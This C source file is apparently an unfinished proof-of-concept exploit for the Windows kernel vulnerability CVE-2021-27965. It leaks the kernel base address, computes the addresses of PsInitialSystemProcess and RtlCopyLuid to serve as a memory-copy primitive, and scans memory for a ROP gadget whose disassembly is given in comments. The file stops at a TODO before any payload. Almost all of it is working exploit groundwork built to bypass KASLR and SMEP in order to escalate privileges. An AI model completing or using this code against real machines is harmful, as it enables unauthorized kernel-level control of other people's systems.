//include NtDll SDK
#include "D:\work\SDK\ntdll.h"
#pragma comment(lib, "ntdll.lib")

//include windows SDK and stdio for logging
#include <Windows.h>
#include <stdio.h>

//print error message, wait for enter and terminate
void __declspec(noreturn) error(const char* szErr)
{
	printf("[-] %s\n", szErr);

	getchar();
	exit(-1);
}

//acquire base address of ntoskrnl.exe module in kernel space
PCHAR GetNtOsKrnlBase(void)
{
	//get required size of SystemModuleInformation array
	DWORD dwSize = 0;

	if (NtQuerySystemInformation(SystemModuleInformation, 0, dwSize, &dwSize) != STATUS_INFO_LENGTH_MISMATCH)
		error("Cannot get length of system module list array");

	//alloc mem for system modules
	PRTL_PROCESS_MODULES pSystemModules = (PRTL_PROCESS_MODULES)malloc(dwSize);

	if (!pSystemModules)
		error("Cannot allocate memory for system module list");

	//query system modules
	if (!NT_SUCCESS(NtQuerySystemInformation(SystemModuleInformation, pSystemModules, dwSize, &dwSize)))
		error("Cannot get system module list");

	DWORD dwCount = pSystemModules->NumberOfModules;
	printf("[+] Found %d system modules\n", dwCount);

	//for each system module check its full path name for substring "ntoskrnl.exe"
	for (DWORD i = 0; i < dwCount; i++)
	{
		if (strstr((const char*)pSystemModules->Modules[i].FullPathName, "ntoskrnl.exe"))
		{
			//now get the image base addr
			PCHAR pBase = (PCHAR)pSystemModules->Modules[i].ImageBase;

			printf("[+] Found ntoskrnl.exe at 0x%p\n", pBase);

			//free system module list and return leaked base address
			free(pSystemModules);
			return pBase;
		}
	}

	//this shouldn't happen
	error("Cannot find ntoskrnl.exe in system module list");
}

//find array of byte (AoB/pattern) in given memory block
DWORD FindROPGadgetOffset(PCHAR pMemBlock, PCHAR pAoB)
{
	DWORD dwLen = 0;

	//count AoB length
	while (pAoB[dwLen])
		++dwLen;

	//loop endlessly in memblock and hope pattern will be found
	for (DWORD i = 0;; i++)
	{
		bool bFound = true;

		//simple implementation of memcmp(pMemBlock + i, pAoB, dwLen)
		for (DWORD j = 0; j < dwLen; j++)
		{
			if (pMemBlock[i + j] != pAoB[j])
			{
				bFound = false;
				break;
			}
		}

		//if bFound was not changed, we found it! return offset from pMemBlock
		if (bFound)
			return i;
	}
}

//entry of console application
DWORD main(DWORD argc, CHAR* argv[])
{
	//hello world
	printf("\n******************************************\n");
	printf("CVE-2021-27965 PoC exploit by mathisvickie");
	printf("\n******************************************\n\n");

	//first, obtain kernel base
	PCHAR NtOsKrnlBase = GetNtOsKrnlBase();

	//load ntoskrnl.exe as resource
	HMODULE hNtOsKrnl = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);

	if (!hNtOsKrnl)
		error("Cannot load ntoskrnl.exe");
	
	//calculate system EPROCESS*
	PCHAR PsInitialSystemProcess = (PCHAR)GetProcAddress(hNtOsKrnl, "PsInitialSystemProcess") - (PCHAR)hNtOsKrnl + NtOsKrnlBase;
	
	//calculate address of RtlCopyLuid in windows kernel (not to confuse with RtlCopyLuid in ntdll - that SMEP would not like)
	//RtlCopyLuid disassembly:
	// mov rax, qword ptr[rdx]
	// mov qword ptr[rcx], rax
	// ret
	PCHAR kRtlCopyLuid = (PCHAR)GetProcAddress(hNtOsKrnl, "RtlCopyLuid") - (PCHAR)hNtOsKrnl + NtOsKrnlBase;

	//calculate address of HvlEndSystemInterrupt ROP gadget, its not exported function so lets AoB scan for it
	//HvlEndSystemInterrupt+1e disassembly:
	// pop rdx
	// pop rax
	// pop rcx
	// ret

	// ... TODO: continue, i will finish and push this later this weekend

	FreeLibrary(hNtOsKrnl);

	return 0;
}
